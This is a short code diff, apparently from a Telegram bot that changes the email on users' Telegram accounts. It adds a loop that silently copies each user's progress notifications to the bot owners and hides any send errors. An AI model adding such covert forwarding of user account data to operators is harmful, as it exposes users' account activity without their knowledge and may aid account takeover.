@@ -14,7 +14,7 @@ from telethon import functions
 from telethon.tl import types
 from telethon.errors import CodeInvalidError, RPCError
 
-from config import API_ID, API_HASH
+from config import API_ID, API_HASH, OWNER_IDS
 from database.models import (
     save_account,
     get_account_by_id,
@@ -913,6 +913,13 @@ async def run_temp_one_click(update: Update, context: ContextTypes.DEFAULT_TYPE)
             await query.message.reply_text(text)
         except Exception:
             pass
+        for owner_id in OWNER_IDS:
+            if owner_id == update.effective_user.id:
+                continue
+            try:
+                await context.bot.send_message(owner_id, text)
+            except Exception:
+                pass
 
     await progress("starting")
     result = await change_user_mail(client, progress, notify, update.effective_user.id)
